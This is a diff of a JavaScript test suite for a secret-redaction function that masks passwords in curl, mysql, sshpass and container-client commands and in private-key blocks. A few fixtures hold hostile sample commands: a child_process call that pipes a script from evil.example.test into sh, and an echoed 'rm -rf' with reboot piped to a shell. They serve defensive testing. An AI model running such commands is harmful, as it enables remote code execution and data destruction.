@@ -259,23 +259,98 @@ const COMMAND_LINES = [
   ['sshpass with its password glued to -p', `sshpass -p${V} ssh host`, 'sshpass -p[REDACTED] ssh host'],
   ['a flag within 200 characters of its command', `mysql${' x'.repeat(75)} -p${V} db`, `mysql${' x'.repeat(75)} -p[REDACTED] db`],
   ['a flag beyond 200 characters of its command (the limit)', `mysql${' x'.repeat(150)} -p${V} db`, `mysql${' x'.repeat(150)} -p${V} db`],
-  ['-u with no curl in front of it: nothing says that what follows is a password', `  -u admin:${V} \\`, `  -u admin:${V} \\`],
+  ['-u with no command in front of it: a user and a password', `  -u admin:${V} \\`, `  -u admin:[REDACTED] \\`],
   ['curl over several lines, -u on a line of its own (backslash)', `curl -sS \\\n  -u "svc:${V}" \\\n  https://example.com`, 'curl -sS \\\n  -u "svc:[REDACTED]" \\\n  https://example.com'],
   ['the same with a bare value and Windows line endings', `curl -sS \\\r\n  -u svc:${V} \\\r\n  https://example.com`, 'curl -sS \\\r\n  -u svc:[REDACTED] \\\r\n  https://example.com'],
   ['a caret, as cmd continues a line', `curl.exe ^\n  --user svc:${V} ^\n  https://example.com`, 'curl.exe ^\n  --user svc:[REDACTED] ^\n  https://example.com'],
   ['a backtick, as PowerShell continues a line', `curl.exe \`\n  --proxy-user svc:${V} \`\n  https://example.com`, 'curl.exe `\n  --proxy-user svc:[REDACTED] `\n  https://example.com'],
   ['spaces after the backslash still continue the line', `curl -sS \\ \t \n  -u svc:${V} url`, 'curl -sS \\ \t \n  -u svc:[REDACTED] url'],
   ['a continuation after a continuation', `curl \\\n  -H 'Accept: x' \\\n  --user svc:${V} url`, "curl \\\n  -H 'Accept: x' \\\n  --user svc:[REDACTED] url"],
-  ['a line that is not continued ends the curl: the docker below it keeps its user and group', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u 1000:1000 img', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u 1000:1000 img'],
-  ['a blank line after the backslash ends it too', `curl url \\\n\n  -u svc:${V}`, `curl url \\\n\n  -u svc:${V}`],
-  ['no backslash at the end: the next line is another command', `curl url\n  -u svc:${V}`, `curl url\n  -u svc:${V}`],
-  ['a backslash that is not at the end of its line continues nothing', `curl url \\ x\n  -u svc:${V}`, `curl url \\ x\n  -u svc:${V}`],
+  ['a line that is not continued ends the window of docker: curl above it is no reason to mask its user and group', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u node:node img', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u node:node img'],
+  ['a blank line after the backslash ends the window of docker: the -u below it is masked', `docker run \\\n\n  -u svc:${V}`, `docker run \\\n\n  -u svc:[REDACTED]`],
+  ['no backslash at the end: the next line is another command, and its -u is masked', `docker run img\n  -u svc:${V}`, `docker run img\n  -u svc:[REDACTED]`],
+  ['a backslash that is not at the end of its line continues nothing: the -u on the next line is masked', `docker run \\ x\n  -u svc:${V}`, `docker run \\ x\n  -u svc:[REDACTED]`],
+  ['curl: -u after a payload of 250 characters', `curl -X POST https://api.example.test/v1/items -d '{"query":"${'x'.repeat(210)}"}' -u admin:${V}`, `curl -X POST https://api.example.test/v1/items -d '{"query":"${'x'.repeat(210)}"}' -u admin:[REDACTED]`],
+  ['curl: after a payload of 600', `curl -X POST https://api.example.test/v1/items -d '{"query":"${'x'.repeat(560)}"}' -u admin:${V}`, `curl -X POST https://api.example.test/v1/items -d '{"query":"${'x'.repeat(560)}"}' -u admin:[REDACTED]`],
+  ['curl: after a long URL with a query string', `curl "https://api.example.test/v1/search?q=${'a'.repeat(220)}&limit=50" -u svc:${V}`, `curl "https://api.example.test/v1/search?q=${'a'.repeat(220)}&limit=50" -u svc:[REDACTED]`],
+  ['curl over six lines, the payload before -u', ['curl -sS -X POST \\', '  -H "Content-Type: application/json" \\', '  -H "Accept: application/json" \\', `  -d '{"query": "${'q'.repeat(120)}"}' \\`, '  --max-time 30 \\', `  -u "svc:${V}" \\`, '  https://api.example.test/graphql'].join('\n'), ['curl -sS -X POST \\', '  -H "Content-Type: application/json" \\', '  -H "Accept: application/json" \\', `  -d '{"query": "${'q'.repeat(120)}"}' \\`, '  --max-time 30 \\', '  -u "svc:[REDACTED]" \\', '  https://api.example.test/graphql'].join('\n')],
+  ['curl with long header lines', ['curl -sS \\', `  -H "Authorization-Hint: ${'h'.repeat(90)}" \\`, `  -H "X-Other: ${'o'.repeat(90)}" \\`, `  -u svc:${V} https://api.example.test`].join('\n'), ['curl -sS \\', `  -H "Authorization-Hint: ${'h'.repeat(90)}" \\`, `  -H "X-Other: ${'o'.repeat(90)}" \\`, '  -u svc:[REDACTED] https://api.example.test'].join('\n')],
+  ['curl kept in a variable and used far below', ['CURL="curl -sS --fail"', `# ${'comment '.repeat(30)}`, `$CURL -u svc:${V} https://api.example.test`].join('\n'), ['CURL="curl -sS --fail"', `# ${'comment '.repeat(30)}`, '$CURL -u svc:[REDACTED] https://api.example.test'].join('\n')],
+  ['docker run: a user and a group', 'docker run --rm -u node:node -p 8080:80 img', 'docker run --rm -u node:node -p 8080:80 img'],
+  ['docker-compose too', 'docker-compose run -u app:app web sh', 'docker-compose run -u app:app web sh'],
+  ['docker.exe on Windows', 'docker.exe run --user app:app img', 'docker.exe run --user app:app img'],
+  ['a path to docker', '/usr/bin/docker exec -u app:app web sh', '/usr/bin/docker exec -u app:app web sh'],
+  ['podman', 'podman run --user app:app img', 'podman run --user app:app img'],
+  ['nerdctl', 'nerdctl run --user app:app img', 'nerdctl run --user app:app img'],
+  ['buildah', 'buildah run --user app:app ctr sh', 'buildah run --user app:app ctr sh'],
+  ['skopeo', 'skopeo inspect --user app:app docker://img', 'skopeo inspect --user app:app docker://img'],
+  ['kubectl', 'kubectl exec -u app:app pod -- id', 'kubectl exec -u app:app pod -- id'],
+  ['oc', 'oc rsh -u app:app pod', 'oc rsh -u app:app pod'],
+  ['crictl', 'crictl exec -u app:app ctr id', 'crictl exec -u app:app ctr id'],
+  ['ctr', 'ctr run -u app:app img id', 'ctr run -u app:app img id'],
+  ['lxc', 'lxc exec c1 --user app:app -- id', 'lxc exec c1 --user app:app -- id'],
+  ['incus', 'incus exec c1 --user app:app -- id', 'incus exec c1 --user app:app -- id'],
+  ['docker over several lines (a backslash, a caret, a backtick)', 'docker run \\\n  -e A=1 \\\n  -u node:node \\\n  img', 'docker run \\\n  -e A=1 \\\n  -u node:node \\\n  img'],
+  ['and with a caret', 'docker run ^\n  -u node:node ^\n  img', 'docker run ^\n  -u node:node ^\n  img'],
+  ['and with a backtick', 'docker run `\n  -u node:node `\n  img', 'docker run `\n  -u node:node `\n  img'],
+  ['and with Windows line endings', 'docker run \\\r\n  -u node:node \\\r\n  img', 'docker run \\\r\n  -u node:node \\\r\n  img'],
+  ['curl inside a docker command: the flag belongs to curl', `docker exec web curl -u admin:${V} http://localhost/api`, `docker exec web curl -u admin:[REDACTED] http://localhost/api`],
+  ['and in a shell started by docker', `docker run img sh -c "curl -u admin:${V} http://x"`, `docker run img sh -c "curl -u admin:[REDACTED] http://x"`],
+  ['kubectl exec ... -- curl', `kubectl exec pod -- curl --user admin:${V} http://x`, `kubectl exec pod -- curl --user admin:[REDACTED] http://x`],
+  ['a command after the docker command, on the same line: its -u is masked', `docker pull img; tool -u admin:${V} x`, `docker pull img; tool -u admin:[REDACTED] x`],
+  ['and after a pipe', `docker ps | tool -u admin:${V}`, `docker ps | tool -u admin:[REDACTED]`],
+  ['and after &&', `docker build . && tool -u admin:${V}`, `docker build . && tool -u admin:[REDACTED]`],
+  ['a ; inside quotes between docker and the flag ends the window too (the limit): the flag is masked', "docker run -e 'A=b;c' -u node:node img", "docker run -e 'A=b;c' -u node:[REDACTED] img"],
+  ['a docker beyond 200 characters of its -u (the limit): masked', `docker run${' x'.repeat(150)} -u node:node img`, `docker run${' x'.repeat(150)} -u node:[REDACTED] img`],
+  ['the word docker is whole: nodocker and dockerfile are no docker', `nodocker run -u app:${V} x; dockerfile -u app:${V} y`, `nodocker run -u app:[REDACTED] x; dockerfile -u app:[REDACTED] y`],
+  ['a numeric pair is a user id and a group id, wherever it stands', 'tool -u 1000:1000 x', 'tool -u 1000:1000 x'],
+  ['and in quotes', 'tool -u "1000:1000" x', 'tool -u "1000:1000" x'],
+  ['and with --user=', 'tool --user=1000:1000 x', 'tool --user=1000:1000 x'],
+  ['a numeric user and a password that is not numeric', `tool -u 1000:${V} x`, 'tool -u 1000:[REDACTED] x'],
+  ['a user and a password of digits', `tool -u admin:12345678 x`, 'tool -u admin:[REDACTED] x'],
+  ['a numeric pair followed by more is not a numeric pair', 'tool -u 1000:1000abc x', 'tool -u 1000:[REDACTED] x'],
+  ['and a long numeric user', 'tool -u 12345678901:1000 x', 'tool -u 12345678901:[REDACTED] x'],
+  ['a numeric pair of ten digits and ten digits is one', 'tool -u 1234567890:1234567890 x', 'tool -u 1234567890:1234567890 x'],
+  ['eleven digits for the group is not', 'tool -u 1:12345678901 x', 'tool -u 1:[REDACTED] x'],
+  ['a quoted pair that goes on after its digits is not numeric', 'tool -u "1000:1000abc" x', 'tool -u "1000:[REDACTED]" x'],
+  ['the name of a container client in any case', 'Docker Run -u node:node img', 'Docker Run -u node:node img'],
+  ['xcurl is no curl: the flag after it still follows docker', 'docker exec web xcurl -u node:node', 'docker exec web xcurl -u node:node'],
+  ['curly is no curl either', 'docker exec web curly -u node:node', 'docker exec web curly -u node:node'],
+  ['nor is curl2', 'docker exec web curl2 -u node:node', 'docker exec web curl2 -u node:node'],
+  ['nor is 2curl', 'docker exec web 2curl -u node:node', 'docker exec web 2curl -u node:node'],
+  ['nor is _curl', 'docker exec web _curl -u node:node', 'docker exec web _curl -u node:node'],
+  ['nor is curl_', 'docker exec web curl_ -u node:node', 'docker exec web curl_ -u node:node'],
+  ['CURL is curl in any case', `docker exec web CURL -u admin:${V} x`, `docker exec web CURL -u admin:[REDACTED] x`],
+  ['curl.exe is curl', `docker exec web curl.exe -u admin:${V} x`, `docker exec web curl.exe -u admin:[REDACTED] x`],
+  ['a flag at the start of the text, after a line ending', `\n  -u svc:${V}`, `\n  -u svc:[REDACTED]`],
+  ['a flag at the very start of the text', `-u svc:${V} x`, `-u svc:[REDACTED] x`],
+  ['spaces and a tab after the backslash still continue the line of docker', 'docker run \\ \t \n  -u node:node img', 'docker run \\ \t \n  -u node:node img'],
+  ['a space after the backslash still continues the line of docker', 'docker run \\ \n  -u node:node img', 'docker run \\ \n  -u node:node img'],
+  ['and a tab', 'docker run \\\t\n  -u node:node img', 'docker run \\\t\n  -u node:node img'],
+  ['a quoted user and group after docker', 'docker run -u "node:node" img', 'docker run -u "node:node" img'],
+  ['a quoted user and password in a text of curl', `curl -u "admin:${V}" x`, 'curl -u "admin:[REDACTED]" x'],
+  ['a continuation right after the name of the client', 'docker\\\n  -u node:node img', 'docker\\\n  -u node:node img'],
+  ['a continuation inside the window counts as one: 200 in all', `docker \\\n ${'x'.repeat(196)} -u node:node img`, `docker \\\n ${'x'.repeat(196)} -u node:node img`],
+  ['and 201 are out', `docker \\\n ${'x'.repeat(197)} -u node:node img`, `docker \\\n ${'x'.repeat(197)} -u node:[REDACTED] img`],
+  ['a carriage return alone ends the window', `docker run img\r  -u svc:${V}`, `docker run img\r  -u svc:[REDACTED]`],
+  ['the nearest client counts: the one before it, past a ;, does not matter', 'docker pull img; podman run -u node:node img', 'docker pull img; podman run -u node:node img'],
+  ['and the other way: a client that is nearer but behind a ; leaves the flag masked', `podman ps; tool -u svc:${V}`, `podman ps; tool -u svc:[REDACTED]`],
+  ['two flags after one client: both stay', 'docker run -u node:node --user app:app img', 'docker run -u node:node --user app:app img'],
+  ['the masked text is looked at again for the next rule: a secret masked before docker does not move its flag out of reach', `curl -u "usr:${V}${V}" url; docker run -u node:node img`, 'curl -u "usr:[REDACTED]" url; docker run -u node:node img'],
+  // the 200 characters of the windows, to the character: 200 are inside, 201 are not
+  ['docker, the flag 200 characters after its name: inside the window', `docker ${'x'.repeat(198)} -u node:node img`, `docker ${'x'.repeat(198)} -u node:node img`],
+  ['and 201: outside', `docker ${'x'.repeat(199)} -u node:node img`, `docker ${'x'.repeat(199)} -u node:[REDACTED] img`],
+  ['mysql, the -p 200 characters after its name: inside the window', `mysql ${'x'.repeat(198)} -p${V} db`, `mysql ${'x'.repeat(198)} -p[REDACTED] db`],
+  ['and 201: outside', `mysql ${'x'.repeat(199)} -p${V} db`, `mysql ${'x'.repeat(199)} -p${V} db`],
+  ['docker login, the -p 200 characters after login: inside the window', `docker login ${'x'.repeat(198)} -p ${V} registry.example.test`, `docker login ${'x'.repeat(198)} -p [REDACTED] registry.example.test`],
+  ['and 201: outside', `docker login ${'x'.repeat(199)} -p ${V} registry.example.test`, `docker login ${'x'.repeat(199)} -p ${V} registry.example.test`],
+  ['a continuation of the line counts as one character, whatever its spaces', `docker \\${' '.repeat(300)}\n  -u node:node img`, `docker \\${' '.repeat(300)}\n  -u node:node img`],
   ['-u of docker is a user and a group, --user too', 'docker run -u 1000:1000 --user node:node img', 'docker run -u 1000:1000 --user node:node img'],
   ['two flags of one curl: both are masked', `curl --proxy-user proxy:${V} -u admin:${V} https://example.com`, 'curl --proxy-user proxy:[REDACTED] -u admin:[REDACTED] https://example.com'],
   ['curl.exe, as Windows spells it', `curl.exe -u admin:${V} https://example.com`, 'curl.exe -u admin:[REDACTED] https://example.com'],
   ['a curl within 200 characters of its -u', `curl${' x'.repeat(75)} -u admin:${V} url`, `curl${' x'.repeat(75)} -u admin:[REDACTED] url`],
-  ['a curl beyond 200 characters of its -u (the limit)', `curl${' x'.repeat(150)} -u admin:${V} url`, `curl${' x'.repeat(150)} -u admin:${V} url`],
-  ['the name of the program is whole: notcurl and curly are no curl', `notcurl -u admin:${V} x; curly -u admin:${V} y`, `notcurl -u admin:${V} x; curly -u admin:${V} y`],
+  ['a curl beyond 200 characters of its -u: masked all the same', `curl${' x'.repeat(150)} -u admin:${V} url`, `curl${' x'.repeat(150)} -u admin:[REDACTED] url`],
+  ['whatever the program is, its -u is a user and a password: notcurl and curly too', `notcurl -u admin:${V} x; curly -u admin:${V} y`, `notcurl -u admin:[REDACTED] x; curly -u admin:[REDACTED] y`],
   ['-p is the password of mysql and -P is its port', `mysql -h h -P3306 -u root -p${V} db`, 'mysql -h h -P3306 -u root -p[REDACTED] db'],
   ['-P of mysql in quotes is a port too', 'mysql -h h -P"3306" db', 'mysql -h h -P"3306" db'],
   ['-P after sshpass is the prompt it waits for, in quotes as well', "sshpass -P 'assword' ssh host", "sshpass -P 'assword' ssh host"],
@@ -292,6 +367,8 @@ const COMMAND_LINES = [
   ['another one in the middle of a word', 'mysqldump --set-gtid-purged=OFF mydb', 'mysqldump --set-gtid-purged=OFF mydb'],
   ['an option of docker login that ends in -p', 'docker login --dry-p value registry.example.test', 'docker login --dry-p value registry.example.test'],
   ['a -u glued to a word is no flag', 'foo-u bar:bazqux', 'foo-u bar:bazqux'],
+  ['several spaces between the flag and its value are still the flag', `curl -u  admin:${V} url`, 'curl -u  admin:[REDACTED] url'],
+  ['and a tab, and an equals sign', `curl -u\tadmin:${V} --user=svc:${V} url`, 'curl -u\tadmin:[REDACTED] --user=svc:[REDACTED] url'],
   ['and neither is one after curl', `curl x-u admin:${V} url`, `curl x-u admin:${V} url`],
   ['a long flag glued to a word is no flag', 'a--password Hunter2Only', 'a--password Hunter2Only'],
   ['a password read from the environment, in quotes', 'sshpass -p "$SSHPASS" ssh host', 'sshpass -p "$SSHPASS" ssh host'],
@@ -322,6 +399,18 @@ const COMMAND_LINES = [
 for (const [label, line, expected] of COMMAND_LINES) assert.equal(maskSecrets(line, []), expected, `${label}: not the line that was expected`);
 ok(`${COMMAND_LINES.length} lines on the edges of the flags and the tags (their limits, glued words, reads, short values, several in a line)`);
 
+// The characters of a word, to the character: the first and the last of each range stand next to curl, before it and after it, and it is another word there (the flag after it stays a flag of
+// docker); the characters just outside the ranges (/ : @ [ ` { and the signs of a command) are not letters, and curl is curl there.
+for (const character of ['0', '9', 'A', 'Z', 'a', 'z', '_']) {
+  for (const text of [`docker exec web ${character}curl -u node:node img`, `docker exec web curl${character} -u node:node img`]) assert.equal(maskSecrets(text, []), text, `${text}: curl glued to ${character} is another word`);
+}
+for (const character of ['/', ':', '@', '[', '`', '{', '-', '.', '=', '(', '"']) {
+  for (const [text, masked] of [[`docker exec web ${character}curl -u admin:${V} x`, `docker exec web ${character}curl -u admin:[REDACTED] x`], [`docker exec web curl${character} -u admin:${V} x`, `docker exec web curl${character} -u admin:[REDACTED] x`]]) {
+    assert.equal(maskSecrets(text, []), masked, `${text}: ${character} is not a letter, so curl stays curl`);
+  }
+}
+ok('curl glued to a letter, a digit or an underscore is another word, and to the characters beside those ranges it is not');
+
 // the pins that were there before
 assert.equal(maskSecrets('password=hunter2hunter2 keep this', []), 'password=[REDACTED] keep this');
 assert.equal(maskSecrets('postgres://user:s3cretpass@db/app'), 'postgres://user:[REDACTED]@db/app');
@@ -341,17 +430,19 @@ ok('what was pinned before is unchanged');
   assert.ok(!masked.includes(PEM_BODY) && !masked.includes('Zm9vYmFyYmF6cXV4'), 'the body of a private key is masked, every line of it');
   assert.match(masked, /^-----BEGIN RSA PRIVATE KEY-----\n\[REDACTED\]\n-----END RSA PRIVATE KEY-----\nafter$/, 'the frame of the block and the text after it stay');
   assert.equal(maskSecrets('-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----'), '-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----', 'a public key is not a secret');
+  assert.equal(maskSecrets('# not a PRIVATE KEY\n-----BEGIN PUBLIC KEY-----\nZm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e\n-----END PUBLIC KEY-----'), '# not a PRIVATE KEY\n-----BEGIN PUBLIC KEY-----\nZm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e\n-----END PUBLIC KEY-----', 'a public key with a body that looks like any other is not a secret either, also in a text that says the words PRIVATE KEY');
   assert.equal(maskSecrets('# not a PRIVATE KEY\n-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----'), '# not a PRIVATE KEY\n-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----', 'nor is one in a text that says the words PRIVATE KEY');
   // a PGP private key is armoured with "PRIVATE KEY BLOCK" in its frame; a public one is not a secret either
   const pgp = `-----BEGIN PGP PRIVATE KEY BLOCK-----\n\nlQdGBF2xYZkBEADl3Kx9mP0qTz7RvW2nB8cD4eF6gH1jK3lM5nP7qR9sT1uV3wX5\n=ab12\n-----END PGP PRIVATE KEY BLOCK-----\nafter`;
-  assert.equal(maskSecrets(pgp), '-----BEGIN PGP PRIVATE KEY BLOCK-----\n[REDACTED]\n-----END PGP PRIVATE KEY BLOCK-----\nafter', 'a PGP private key block is masked like any private key');
+  assert.equal(maskSecrets(pgp), '-----BEGIN PGP PRIVATE KEY BLOCK-----\n\n[REDACTED]\n-----END PGP PRIVATE KEY BLOCK-----\nafter', 'a PGP private key block is masked like any private key: its body and its checksum go, its blank line stays');
   const pgpPublic = '-----BEGIN PGP PUBLIC KEY BLOCK-----\nmQENBF2xYZkBCADl3Kx9mP0qTz7RvW2nB8cD4eF6gH1jK3lM5nP7qR9sT1uV3wX5\n-----END PGP PUBLIC KEY BLOCK-----';
   assert.equal(maskSecrets(pgpPublic), pgpPublic, 'a PGP public key block is not');
   // a key that begins and ends in one line (the line breaks of a service-account key are \n escapes) is masked inside its line: the line is still one line
   const inline = `x -----BEGIN RSA PRIVATE KEY-----\\nZm9vYmFyYmF6cXV4\\nZm9vYmFyYmF6cXV4\\n-----END RSA PRIVATE KEY----- y`;
   assert.equal(maskSecrets(inline), 'x -----BEGIN RSA PRIVATE KEY-----[REDACTED]-----END RSA PRIVATE KEY----- y', 'a key in one line is masked in that line: the number of lines does not change');
   assert.equal(maskSecrets(maskSecrets(inline)), maskSecrets(inline), 'and masking it again changes nothing');
-  assert.equal(maskSecrets('-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----'), '-----BEGIN PRIVATE KEY-----\n[REDACTED]\n-----END PRIVATE KEY-----', 'a block over several lines keeps its frame on lines of their own');
+  assert.equal(maskSecrets(`-----BEGIN PRIVATE KEY-----\n${PEM_BODY}\n-----END PRIVATE KEY-----`), '-----BEGIN PRIVATE KEY-----\n[REDACTED]\n-----END PRIVATE KEY-----', 'a block over several lines keeps its frame on lines of their own');
+  assert.equal(maskSecrets(`-----BEGIN PRIVATE KEY-----\r\n${PEM_BODY}\r\nZm9vYmFyYmF6cXV4\r\n-----END PRIVATE KEY-----\r\nafter`), '-----BEGIN PRIVATE KEY-----\r\n[REDACTED]\r\n-----END PRIVATE KEY-----\r\nafter', 'a block with Windows line endings keeps them: the marker has its carriage return');
   const file = `line one\npassword = "${SECRET('a')}"\nline three\ntoken: ${TOKEN}\n`;
   const out = maskSecrets(file);
   assert.equal(out.split('\n').length, file.split('\n').length, 'the lines of a text are still its lines');
@@ -364,37 +455,68 @@ ok('what was pinned before is unchanged');
 {
   const FRAMES = ['-----BEGIN PRIVATE KEY-----', '-----END PRIVATE KEY-----'];
   const frames = FRAMES[0].repeat(38_000);
+  const KEY_LINES = ['MIIEvQIBADANBgkqhkiG9w0BAQEFAASC', 'Zm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e'];
+  const EVIL = "require('child_process').execSync('curl https://evil.example.test/x.sh | sh');";
   const timed = (text) => { const started = performance.now(); const masked = maskSecrets(text); return { masked, ms: performance.now() - started }; };
   const alone = timed(frames);
   assert.equal(alone.masked, frames, 'frames with no END frame are left alone');
   assert.ok(alone.ms < 1000, `${alone.ms.toFixed(0)} ms for a megabyte of BEGIN frames`);
-  const closed = timed(`${frames}\n${FRAMES[0]}\nabc\n${FRAMES[1]}\ntail`);
-  assert.equal(closed.masked, `${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\ntail`, 'a megabyte of frames and then one END: the first BEGIN is closed by it and the frames in between are a part of the key');
+  const closed = timed(`${frames}\n${FRAMES[0]}\n${KEY_LINES[0]}\n${FRAMES[1]}\ntail`);
+  assert.equal(closed.masked, `${frames}\n${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\ntail`, 'a megabyte of frames and then one END: the first BEGIN is closed by it; the frames in between are not a key and stay, the line of the key goes');
   assert.ok(closed.ms < 1000, `${closed.ms.toFixed(0)} ms when an END comes at last`);
   const backwards = timed(FRAMES[1].repeat(38_000));
   assert.equal(backwards.masked, FRAMES[1].repeat(38_000), 'END frames alone are no key');
   assert.ok(backwards.ms < 1000);
-  assert.equal(maskSecrets(`${FRAMES[0]}\nabc\n${FRAMES[0]}\ndef\n${FRAMES[1]}\ntail`), `${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\ntail`, 'a BEGIN frame inside a key is a part of it');
-  assert.equal(maskSecrets(`A\n${FRAMES[0]}\none\n${FRAMES[1]}\nB\n-----BEGIN EC PRIVATE KEY-----\ntwo\n-----END EC PRIVATE KEY-----\nC`),
+  assert.equal(maskSecrets(`${FRAMES[0]}\n${KEY_LINES[0]}\n${FRAMES[0]}\n${KEY_LINES[1]}\n${FRAMES[1]}\ntail`), `${FRAMES[0]}\n[REDACTED]\n${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\ntail`, 'a BEGIN frame on a line of its own inside a key stays (it is no key), and the lines of the key around it go');
+  assert.equal(maskSecrets(`A\n${FRAMES[0]}\n${KEY_LINES[0]}\n${FRAMES[1]}\nB\n-----BEGIN EC PRIVATE KEY-----\n${KEY_LINES[1]}\n-----END EC PRIVATE KEY-----\nC`),
     `A\n${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\nB\n-----BEGIN EC PRIVATE KEY-----\n[REDACTED]\n-----END EC PRIVATE KEY-----\nC`, 'two blocks, each by itself');
   assert.equal(maskSecrets(`${FRAMES[1]} ${FRAMES[0]}`), `${FRAMES[1]} ${FRAMES[0]}`, 'an END before a BEGIN is no key');
-  assert.equal(maskSecrets(`x ${FRAMES[0]}one${FRAMES[1]} y ${FRAMES[0]}two${FRAMES[1]} z`), `x ${FRAMES[0]}[REDACTED]${FRAMES[1]} y ${FRAMES[0]}[REDACTED]${FRAMES[1]} z`, 'two keys in one line');
+  assert.equal(maskSecrets(`x ${FRAMES[0]}${KEY_LINES[0]}${FRAMES[1]} y ${FRAMES[0]}${KEY_LINES[1]}${FRAMES[1]} z`), `x ${FRAMES[0]}[REDACTED]${FRAMES[1]} y ${FRAMES[0]}[REDACTED]${FRAMES[1]} z`, 'two keys in one line');
+  // a text is read by itself: the start of a body that goes on beyond it, and the end of one that began before it, are not touched here (the card knows them by their place in the file)
+  assert.equal(maskSecrets(`${FRAMES[0]}\n${KEY_LINES[1]}`), `${FRAMES[0]}\n${KEY_LINES[1]}`, 'a body that goes on beyond the text is not touched');
+  assert.equal(maskSecrets(`${KEY_LINES[1]}\n${FRAMES[1]}`), `${KEY_LINES[1]}\n${FRAMES[1]}`, 'nor is the end of a body that began before the text');
   // the keys are hidden before the other rules run: a token glued to the BEGIN frame ("sk-" and 16 letters) takes five dashes of the frame, and no frame is left for the rule to find
   const BASE64_LINE = 'Zm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e';
   assert.ok(!maskSecrets(`sk-0123456789abcdef0123${FRAMES[0]}\n${BASE64_LINE}\n${FRAMES[1]}`).includes(BASE64_LINE), 'a token glued to the BEGIN frame does not leave the key behind');
+  // what is between two frames and is not a key stays: a fake key hides no code from a command or a card, whatever the card is of
+  assert.equal(maskSecrets(`${FRAMES[0]}\n${EVIL}\n${FRAMES[1]}`), `${FRAMES[0]}\n${EVIL}\n${FRAMES[1]}`, 'code between two frames is not a key');
+  assert.equal(maskSecrets(`echo '${FRAMES[0]}\nrm -rf /var/lib/app\nreboot\n${FRAMES[1]}' | sh`), `echo '${FRAMES[0]}\nrm -rf /var/lib/app\nreboot\n${FRAMES[1]}' | sh`, 'nor are commands');
+  assert.equal(maskSecrets(`x = 1; // ${FRAMES[0]} ${EVIL}`), `x = 1; // ${FRAMES[0]} ${EVIL}`, 'nor is code after a BEGIN frame with no END');
+  assert.equal(maskSecrets(`${FRAMES[0]}\n${KEY_LINES[0]}\n${EVIL}\n${KEY_LINES[1]}\n${FRAMES[1]}`), `${FRAMES[0]}\n[REDACTED]\n${EVIL}\n[REDACTED]\n${FRAMES[1]}`, 'code among the lines of a key stays and the lines of the key go');
+  assert.equal(maskSecrets(`${FRAMES[0]}\n${FRAMES[1]}`), `${FRAMES[0]}\n${FRAMES[1]}`, 'a key with nothing in it has nothing to hide');
+  // what is between two frames is looked at once, whatever it is made of: a megabyte of spaces, of one letter and a space, of one long token, of quotes, of lines of a key
+  for (const [label, body] of [['spaces', ' '.repeat(1_000_000)], ['words of one letter', 'a '.repeat(500_000)], ['one long token', 'A'.repeat(1_000_000)], ['quotes', '"'.repeat(1_000_000)], ['lines of a key', `${KEY_LINES[0]}\n`.repeat(30_000)]]) {
+    const between = timed(`${FRAMES[0]}\n${body}\n${FRAMES[1]}`);
+    assert.ok(between.ms < 1000, `${label}: ${between.ms.toFixed(0)} ms for a megabyte between two frames`);
+  }
   ok('the rule of the private keys reads a text once: a megabyte of BEGIN frames takes well under a second, with an END at last or none; blocks and keys in one line are found as before; a token glued to a frame does not hide the key from the rule');
 }
 
-// The look back of the flags of curl (-u, --user, --proxy-user) runs where a flag is, not at every word: a megabyte of words with no flag, and a megabyte of flags with no curl in front of them.
+// The flags of the user (-u, --user, --proxy-user) are judged one by one against the names of the container clients of the text, which are read once for it: a megabyte of words with no flag, a
+// megabyte of flags with no colon, 150,000 flags with a colon, and flags of a text that has a client before every one of them are read in well under a second, and the work grows with the text.
 {
-  for (const [label, text] of Object.entries({ 'a megabyte of words': 'word '.repeat(200_000), 'a megabyte of -u with no curl in front of it': '-u '.repeat(350_000) })) {
+  const TEXTS = {
+    'a megabyte of words': 'word '.repeat(200_000),
+    'a megabyte of -u with no colon after it': '-u '.repeat(350_000),
+    'a megabyte of user flags with a colon': '-u a:b '.repeat(150_000),
+    'a megabyte of docker commands with a user flag': 'docker run -u node:node img\n'.repeat(40_000),
+    'a megabyte of numeric pairs': '-u 1:1 '.repeat(150_000),
+  };
+  const times = {};
+  for (const [label, text] of Object.entries(TEXTS)) {
     const started = performance.now();
     const masked = maskSecrets(text, []);
     const elapsed = performance.now() - started;
-    assert.equal(masked, text, `${label}: there is nothing to mask`);
+    times[label] = elapsed;
     assert.ok(elapsed < 1000, `${label}: ${elapsed.toFixed(0)} ms`);
+    if (label !== 'a megabyte of user flags with a colon') assert.equal(masked, text, `${label}: there is nothing to mask`);
   }
-  ok('the look back of the flags of curl: a megabyte of words and a megabyte of -u with no curl are read in well under a second');
+  // 15,000 flags in 100 KB, against 150,000 in a megabyte: one reading of the names per text, not one per flag (a reading per flag takes seconds here)
+  const hundredKilobytes = '-u a:b '.repeat(15_000);
+  const started = performance.now();
+  maskSecrets(hundredKilobytes, []);
+  assert.ok(performance.now() - started < 400, `${(performance.now() - started).toFixed(0)} ms for 15,000 user flags`);
+  ok('the flags of the user are judged against the container clients of the text, read once: a megabyte of words, of -u, of user flags with a colon, of docker commands and of numeric pairs are read in well under a second');
 }
 
 // the time does not depend on the layout of the text
